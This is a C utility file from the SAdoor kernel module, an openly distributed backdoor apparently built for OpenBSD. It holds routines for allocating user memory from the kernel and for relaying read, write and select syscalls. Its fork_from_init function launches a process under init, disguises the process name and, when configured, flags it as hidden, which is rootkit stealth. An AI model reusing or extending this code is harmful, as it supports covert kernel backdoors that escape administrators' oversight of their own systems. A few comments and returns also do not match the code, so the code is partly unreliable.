/*
 *  File: utils.c
 *  Author: Claes M. Nyberg <md0claes@mdstud.chalmers.se>
 *  Description: SAdoor kmod common used routines
 *  Version: 1.0
 *  Date: Thu Jul  3 15:48:22 CEST 2003
 *
 *  Copyright (c) 2003 Claes M. Nyberg <md0claes@mdstud.chalmers.se>
 *  All rights reserved, all wrongs reversed.
 *
 *  Redistribution and use in source and binary forms, with or without
 *  modification, are permitted provided that the following conditions
 *  are met:
 * 
 *  1. Redistributions of source code must retain the above copyright
 *     notice, this list of conditions and the following disclaimer.
 *  2. Redistributions in binary form must reproduce the above copyright
 *     notice, this list of conditions and the following disclaimer in the
 *     documentation and/or other materials provided with the distribution.
 *  3. The name of author may not be used to endorse or promote products
 *     derived from this software without specific prior written permission.
 * 
 *  THIS SOFTWARE IS PROVIDED ``AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES,
 *  INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY
 *  AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL
 *  THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 *  EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
 *  PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS;
 *  OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,
 *  WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR
 *  OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF
 *  ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */         

#include <sys/types.h>
#include <sys/systm.h>
#include <sys/param.h>
#include <sys/kernel.h>
#include <sys/unistd.h>
#include <sys/mount.h>
#include <sys/mman.h>
#include <sys/malloc.h>
#include <sys/proc.h>
#include <sys/kthread.h>
#include <sys/select.h>
#include <sys/syscallargs.h>
#include "sadoor.h"

/*
 * Allocates userland memory.
 *
 * Adds a sys_munap_args "header" for uland_free() to use.
 */
void *
uland_calloc(size_t size)
{
    struct sys_mmap_args margs;
    struct sys_munmap_args *muargs;
    struct proc *p;
	register_t retval[2];
    int error;

    p = curproc;

	if (p == NULL) {
		debug(1, "uland_calloc(): curproc is NULL\n");
		return;
	}

	debug(3, "Entered uland_calloc(%u)\n", size);
	
    SCARG(&margs, addr) = 0x00;
    SCARG(&margs, len) = size + sizeof(struct sys_munmap_args);
    SCARG(&margs, prot) = PROT_READ|PROT_WRITE;
    SCARG(&margs, flags) = MAP_ANON|MAP_PRIVATE;
    SCARG(&margs, fd) = -1;
    SCARG(&margs, pad) = 0x0;
    SCARG(&margs, pos) = 0;

    if (size == 0) {
        log(1, "Error: uland_calloc(): Refusing to allocate zero bytes\n");
        return(NULL);
    }

    if ( (error = sys_mmap(p, &margs, retval))) {
        log(1, "Panic: mmap() failed: %d [exiting]\n", error);

		if (p->p_pid != 0)
        	exit1(p, error);
    	
		return(NULL);
	}
    
    muargs = (struct sys_munmap_args *)(retval[0]);
    memset(muargs, 0x00, sizeof(struct sys_munmap_args) + size);
    (void)suword(&SCARG(muargs, addr), (int)muargs);
    (void)suword(&SCARG(muargs, len), sizeof(struct sys_munmap_args) + size);

    debug(3, "uland_calloc(): Returning address 0x%08x for block of %u bytes\n",
        (u_int)muargs, size + sizeof(struct sys_munmap_args));

    return((void *)(muargs +1));
}

/*
 * Free userland memory allocated with uland_malloc()
 */
void
uland_free(void *upt)
{
    struct sys_munmap_args *muargs;
    struct proc *p;
    u_int len;
	register_t retval[2];
    int error;

    if (upt == NULL) {
        log(1, "Error: uland_free(): Received NULL pointer\n");
        return;
    }

    p = curproc;

	if (p == NULL) {
		debug(1, "uland_free(): curproc is NULL\n"); 
		return;
	}
	
    muargs = (struct sys_munmap_args *)upt -1;
    len = (u_int)fuword(&SCARG(muargs, len));
    
    if ( (error = sys_munmap(p, muargs, retval))) {
        log(1, "Error: Failed to free memory: %d\n", error);
    }
    else {
        debug(3, "uland_free(): Free'd %u bytes\n", len);
    }
}

/*
 * Allocate kernel space memory as, ehrm, temporary memory.
 */
void *
kspace_calloc(size_t size)
{
    void *ptr;

    if ( (ptr = malloc(size, M_TEMP, M_WAITOK)) == NULL) {
        log(1, "Panic: kspace_calloc(): malloc() failed [exiting]\n");

		if (curproc->p_pid != 0)
       		exit1(curproc, 1);
    }
	memset(ptr, 0x00, size);
    return(ptr);
}

/*
 * Fork from init, returns 0 on success.
 */
int
fork_from_init(void (*function)(void *), void *arg)
{
    struct proc *uproc;
	struct proc *tmp;
	register_t retval[2];
    int error;
    int s;

    s = splhigh();
		tmp = curproc;
		curproc = (curproc ==  NULL) ? &proc0 : curproc;

		if ( (error = fork1(initproc, SIGCHLD, FORK_FORK, NULL, 0, function, arg, retval))) {
			log(1, "Error: fork_from_init(): Can't fork: %d\n", error);
			splx(s);
			return(error);
		}

		if ( (uproc = pfind(retval[0])) == NULL) {
			log(1, "Error: fork_from_init(): pfind() couldn't find child!\n");
			splx(s);
			return(1);
		}

#ifdef SAKMOD_HIDE_PROCS
        uproc->p_flag |= SAKMOD_HIDDEN_PROC_FLAG;
#endif /* SAKMOD_HIDE_PROCS */

        snprintf(uproc->p_comm, MAXCOMLEN, "%s", SAKMOD_PROC_NAME);
        debug(2, "Forked from init, got pid %d (struct proc = 0x%08x)\n", uproc->p_pid, uproc);
		curproc = tmp;

	splx(s);
    return(0);
}


/*
 * Write N bytes to a file descriptor,
 * wargs is assumed to be a userland address.
 */
ssize_t
writen(struct proc *p, struct sys_write_args *wargs)
{
    size_t tot = 0;
    ssize_t n;
    u_char *pt;
	register_t retval[2];
    int error;

    n = fuword(&SCARG(wargs, nbyte));
    pt = (u_char *)fuword(&SCARG(wargs, buf));

    do {
        (void)suword(&SCARG(wargs, buf), (int)(pt + tot));
        (void)suword(&SCARG(wargs, nbyte), n - tot);

        if ( (error = sys_write(p, wargs, retval))) {
            log(1, "Error: writen(): %d\n", error);
            return(-1);
        }
        
        tot += retval[0];
    } while (tot < n);

    debug(3, "Wrote %d bytes\n", tot);
    return(tot);
}

/*
 * Read N bytes from a file descriptor,
 * rargs is assumed to be a userland address.
 */
ssize_t
readn(struct proc *p, struct sys_read_args *rargs)
{
    ssize_t tot = 0;
    ssize_t n;
    u_char *pt;
	register_t retval[2];
    int error;

    n = fuword(&SCARG(rargs, nbyte));
    pt = (u_char *)fuword(&SCARG(rargs, buf));

    do {
        (void)suword(&SCARG(rargs, buf), (int)(pt + tot));
        (void)suword(&SCARG(rargs, nbyte), n - tot);
        
        if ( (error = sys_read(p, rargs, retval))) {
            log(1, "Error: readn(): %d\n", error);
            return(-1);
        }
        
        tot += retval[0];
    } while (tot < n);

    debug(3, "readn(): Read %d bytes\n", tot);
    return(tot);
}

/*  
 * Locate bytes in buffer.
 * Returns index to start of str in buf on success, 
 * -1 if string was not found.
 */ 
ssize_t
utils_memstr(void *big, size_t blen, const void *little, size_t llen)
{
    ssize_t i = 0;
 
    if (blen < llen) 
        return(-1);
 
    while ( (blen - i) >= llen) {
        if (memcmp(((char *)big + i), little, llen) == 0)
            return(i); 
        i++;
    }
 
    return(-1); 
}

/*  
 * Returns 1 if file descriptor is ready for writing,
 * 0 otherwise.
 */ 
int 
ready_write(int fd)
{
    fd_set *writeset;
    struct sys_select_args *slargs;
    struct timeval *tv;
    struct proc *p;
	register_t retval[2];
    int error = 0;

    p = curproc;
    writeset = (fd_set *)uland_calloc(sizeof(fd_set) + 
            sizeof(struct sys_select_args) + 
            sizeof(struct timeval));
    slargs = (struct sys_select_args *)(writeset +1);
    tv = (struct timeval *)(slargs +1);
 
    FD_ZERO(writeset);
    FD_SET(fd, writeset);

    (void)suword(&SCARG(slargs, nd), fd+1);
    (void)suword(&SCARG(slargs, in), NULL);
    (void)suword(&SCARG(slargs, ou), (int)writeset);
    (void)suword(&SCARG(slargs, ex), NULL);
    (void)suword(&SCARG(slargs, tv), (int)tv);
    if ((error = sys_select(p, slargs, retval))) {
        log(1, "Error: ready_write(): select failed: %d\n", error);
        uland_free(writeset);
        return(0);
    }
    uland_free(writeset);
    return(retval[0] > 0 ? 1 : 0); 
}

/*
 * Fetch userland word
 */
register_t
fuword(void *uaddr)
{
	register_t kvar;

	/* FIXME: Check return */
	(void)copyin(uaddr, &kvar, sizeof(register_t));
	return(kvar);
}

/*
 * Fetch userland byte
 */
u_char
fubyte(void *uaddr)
{
    u_char kvar;
 
	/* FIXME: Check return */
    (void)copyin(uaddr, &kvar, sizeof(u_char));
    return(kvar);
}

/*
 * Store word to userland
 */
int
suword(void *uaddr, register_t kval)
{
	return(copyout(&kval, uaddr, sizeof(register_t)));
}

/*
 * Store byte to userland
 */
int
subyte(void *uaddr, u_char kval)
{
    return(copyout(&kval, uaddr, sizeof(u_char)));
}

